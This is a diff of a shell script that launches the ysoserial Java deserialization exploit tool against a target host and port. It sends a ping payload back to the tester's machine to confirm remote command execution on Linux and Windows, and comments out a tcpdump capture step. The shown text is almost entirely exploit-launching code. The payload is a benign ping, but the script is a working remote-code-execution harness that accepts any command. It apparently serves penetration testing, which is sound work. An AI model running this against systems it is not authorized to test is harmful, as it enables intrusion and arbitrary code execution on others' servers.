@@ -39,27 +39,27 @@ print_info "Running ysoserial command for target Linux"
 print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"/bin/ping -c 4 ${LOCALIP}\""
 java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "/bin/ping -c 4 ${LOCALIP}"
 
-print_info "Wait a little bit..."
-sleep 3
-PID=$(ps -e | pgrep tcpdump)
-print_info "Kill tcpdump (PID=${PID})"
-sudo kill -9 $PID 
-sleep 2
+# print_info "Wait a little bit..."
+# sleep 3
+# PID=$(ps -e | pgrep tcpdump)
+# print_info "Kill tcpdump (PID=${PID})"
+# sudo kill -9 $PID 
+# sleep 2
 
-print_info "Captured ICMP traffic:"
-echo
-sudo tcpdump -r /tmp/dump.pcap
-echo
+# print_info "Captured ICMP traffic:"
+# echo
+# sudo tcpdump -r /tmp/dump.pcap
+# echo
 
-print_info "Delete capture"
-sudo rm /tmp/dump.pcap
+# print_info "Delete capture"
+# sudo rm /tmp/dump.pcap
 
-print_info "Restart tcpdump..."
-sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
+# print_info "Restart tcpdump..."
+# sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 
 print_info "Running ysoserial command for target Windows"
-print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"ping ${LOCALIP}\""
-java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "ping ${LOCALIP}"
+print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"ping -n 4 ${LOCALIP}\""
+java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "ping -n 4 ${LOCALIP}"
 
 print_info "Wait a little bit..."
 sleep 3
